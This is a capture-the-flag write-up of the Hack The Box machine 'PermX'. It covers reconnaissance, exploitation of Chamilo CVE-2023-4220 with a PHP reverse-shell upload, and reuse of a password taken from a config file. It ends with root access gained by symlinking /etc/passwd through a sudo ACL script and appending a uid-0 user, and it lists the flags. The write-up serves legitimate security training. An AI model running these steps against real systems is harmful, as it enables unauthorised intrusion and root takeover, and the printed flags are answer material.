```json
Alias: PermX
Date: 01-11_2024
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.23
```

# PermX
# Summary

- There is a subdomain is `lms.permx.htb` which is running a vulnerable version of `Chamilo`, this gives us a foothold into the box. We find database credentials and the same credentials can be used to log in to a user named `mtz`. `mtz` has `sudo` permissions over a script which we leverage to gain superuser privileges.


---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-01 16:59 PKT
Nmap scan report for 10.10.11.23
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
```
## Discovered Subdomains
```
permx.htb
lms.permx.htb
```

---
# Enumeration

Doing subdomain enumeration on port 80 we find the domain `lms.permx.htb`.  It seems that the domain is hosting a vulnerable version of `chamilo`. This version has a vulnerability that allows unauthenticated attackers to upload files.

---

# Exploitation

## CVE-2023-4220

This PoC can be used to exploit it: https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit

```sh
./CVE-2023-4220.sh -f php-reverse-shell-new.php -h http://lms.permx.htb
```


---

# Lateral Movement

We can find the database password being used at `/var/www/chamilo/app/config/configuration.php`. This database can be used to log into the `mtz` user.

| Username | Password         |
| -------- | ---------------- |
| mtz      | 03F6lY3uXAP2bkW8 |

---

# Privilege Escalation

We have `sudo` permissions to execute the file `/opt/acl.sh` It can be used to change permissions for any file if it is present in the users home directory. So, we can create a `symlink` to `/etc/passwd` in our home directory. Grant ourselves full permissions over the `symlink` using the script. Then append a fake user with the `uid` of root to it. That means if we then `su` into that user, we will be logged in as root.

```sh
ln -s /etc/passwd tmp
```

```sh
sudo /opt/acl.sh mtz rwx /home/mtz/.tmp/tmp
```

```sh
echo "fake_user::0:0::/root:/bin/bash" >> tmp
```

```sh
su fake_user
```

---

# Flags
- c0e5127b9d84b539a1053aa8c41ef4f9
- a7afc919dd601cf08276f5c131394103

#CTF